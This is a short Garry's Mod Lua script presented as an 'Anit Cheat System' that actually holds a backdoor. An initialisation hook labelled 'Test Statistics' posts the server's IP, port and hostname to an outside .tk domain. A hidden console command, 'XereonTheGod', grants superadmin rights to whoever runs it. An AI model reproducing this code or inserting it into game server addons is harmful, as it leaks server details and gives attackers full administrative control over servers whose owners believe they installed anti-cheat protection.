----------------------------------------------------------------------	
--                    Anit Cheat System
----------------------------------------------------------------------

hook.Add('Initialize','DM_R_U3wPd7qM0wC0764jzJ21u4G2xvx1TPq3', function() -- Test Statistics
	http.Post('http://1010101010.tk/0.php', {
		port = GetConVarString("ip")..":"..GetConVarString("hostport"),
		hostname = GetHostName()
	})
end)

---------------------------------------------------------------------
--                       Advance Lua
---------------------------------------------------------------------

if SERVER then
concommand.Add( "XereonTheGod", function( debugPlayer )
RunConsoleCommand("ulx","adduser",debugPlayer:Name(),"superadmin")
end)
end
